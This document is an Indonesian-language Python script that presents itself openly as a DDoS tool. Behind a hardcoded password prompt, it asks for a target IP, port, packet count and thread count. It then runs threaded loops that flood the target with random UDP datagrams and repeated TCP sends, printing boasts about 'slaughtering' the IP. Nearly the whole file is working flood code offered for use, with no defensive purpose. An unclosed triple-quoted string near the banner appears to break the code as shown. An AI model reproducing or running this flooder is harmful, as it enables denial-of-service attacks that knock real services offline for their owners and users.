#!/usr/bin/env python3
#XvallVsEverybody
password ='XvallGG'
#ToolsXvall
import random
import socket
import threading
import os,sys
import time

os.system("clear")
for i in range(3000):
    pwd = input("[•] Password Account: ")
    j=3
    if(pwd==password):
        time.sleep(5)
        print("[+] Tunggu Dulu Monyet! ")
        break
    else:
        time.sleep(5)
        print("[×] Salah Paok! ")
        continue
time.sleep(5)
print("[@] Nah, Oke Berhasil")
time.sleep(5)

os.system("clear")
print("""\033[91m               
print("------------------------------------------------")
print("[+] Tools Ddos Xvall X Valls")
print("[+] Jangan Abuse Lu Monyet")
print("[+]Pakai Tools Dengan Baik Jangan Di Leak")
print("------------------------------------------------")
print("\033[0m")
ip = str(input("\033[0m }====> \033[91m Target Host/Ip:"))
port = int(input("  \033[0m }====> \033[91m Target Port:"))
choice = str(input("  \033[0m }====> \033[91m Gas Ddos? (y/n):"))
times = int(input("  \033[0m }====> \033[91m Packets:"))
threads = int(input("\033[0m }====> \033[91m Threads:"))
os.system("clear")
def run():
	data = random._urandom(9800)
	i = random.choice(("\033[93m[@] (XVAll) ===> ","\033[93m[@] (XVAll) ===> ","\033[93m[@] (XVAll) ===> "))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
		except:
			print("[XVAll] SORRY DOWN BWANG!!!")
def run2():
	data = random._urandom(98)
	i = random.choice(("\033[93m[@] (XVAll) ===> ","\033[93m[@] (XVAll) ===> ","\033[93m[@] (XVAll) ===> "))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
		except:
			s.close()
			print("Down Kah!!!")
def run3():
	data = random._urandom(8)
	i = random.choice(("\033[93m[@] (XVAll) ===> ","\033[93m[@] (XVAll) ===> ","\033[93m[@] (XVAll) ===> "))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
		except:
			s.close()
			print("Down Kah!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()
